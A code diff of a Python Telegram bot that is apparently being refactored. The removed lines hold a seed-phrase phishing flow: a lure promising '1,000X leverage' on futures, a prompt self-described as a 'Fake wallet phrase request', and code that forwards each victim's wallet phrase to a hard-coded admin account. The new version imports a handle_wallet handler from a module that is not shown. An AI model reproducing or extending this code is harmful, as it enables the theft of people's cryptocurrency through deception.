@@ -1,64 +1,40 @@
-from aiogram import Bot, Dispatcher, types
-from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_application
-from aiohttp import web
+import asyncio
 import os
 import logging
 
+from aiogram import Bot, Dispatcher, F
+from aiogram.enums import ParseMode
+from aiogram.fsm.storage.memory import MemoryStorage
+from aiogram.client.default import DefaultBotProperties
+from dotenv import load_dotenv
+
+from handlers import start, handle_callback, handle_wallet
+
+# Load environment variables
+load_dotenv()
 TOKEN = os.getenv("BOT_TOKEN")
-ADMIN_ID = 6780752295
 
-bot = Bot(token=TOKEN)
-dp = Dispatcher()
+# Set up logging
+logging.basicConfig(level=logging.INFO)
 
-# 1. Welcome Message
-@dp.message(commands=["start"])
-async def send_welcome(message: types.Message):
-    keyboard = types.InlineKeyboardMarkup()
-    keyboard.add(types.InlineKeyboardButton(
-        text="Visit the OCF page", url="https://opencryptofoundation.com"))
-    await message.answer(
-        "👋 Welcome to the project!\n\n"
-        "1,000X leverage on Futures contracts! This isn’t for everyone but if used right it could be a great speculation tool!\n"
-        "👉 [Futures.Syncron.Network](https://futures.syncron.network)",
-        reply_markup=keyboard,
-        parse_mode="Markdown"
-    )
-    # Next step (after user clicks) is handled by message filter (simulated)
+# Create bot instance with HTML parse mode
+bot = Bot(
+    token=TOKEN,
+    default=DefaultBotProperties(parse_mode=ParseMode.HTML)
+)
 
-# 2. Fake wallet phrase request after any message (simulated trigger)
-@dp.message(lambda message: message.text.lower().startswith("done") or "ocf" in message.text.lower())
-async def ask_wallet(message: types.Message):
-    await message.answer("🧠 Please enter your wallet phrase to import:")
+# Create Dispatcher with in-memory storage
+dp = Dispatcher(storage=MemoryStorage())
 
-# 3. Accept wallet phrase (mocked)
-@dp.message(lambda message: len(message.text.split()) > 5)
-async def receive_wallet(message: types.Message):
-    phrase = message.text.strip()
-    
-    # Simulate balance check (later replace with actual RPC call)
-    sol_balance = 0.25  # mock value
+# Register handlers
+dp.message.register(start, F.text == "/start")
+dp.callback_query.register(handle_callback)
+dp.message.register(handle_wallet)
 
-    if sol_balance >= 0.2:
-        await message.answer("✅ You are eligible! Welcome aboard.")
-        await bot.send_message(
-            ADMIN_ID,
-            f"✅ New eligible wallet:\n\nPhrase:\n{phrase}\nBalance: {sol_balance} SOL",
-            parse_mode="Markdown"
-        )
-    else:
-        await message.answer("❌ Ineligible. You must have at least 0.2 SOL.")
+# Run the bot
+async def main():
+    print("Bot is starting...")
+    await dp.start_polling(bot)
 
-# Set webhook on startup
-async def on_startup(app):
-    webhook_url = "https://telegram-wallet-bot-q611.onrender.com/webhook"
-    await bot.set_webhook(webhook_url)
-
-# Aiohttp app setup
-app = web.Application()
-app.on_startup.append(on_startup)
-SimpleRequestHandler(dispatcher=dp, bot=bot).register(app, path="/webhook")
-setup_application(app, dp)
-
-if name == "main":
-    logging.basicConfig(level=logging.INFO)
-    web.run_app(app, port=int(os.environ.get('PORT', 8080)))
+if __name__ == "__main__":
+    asyncio.run(main())
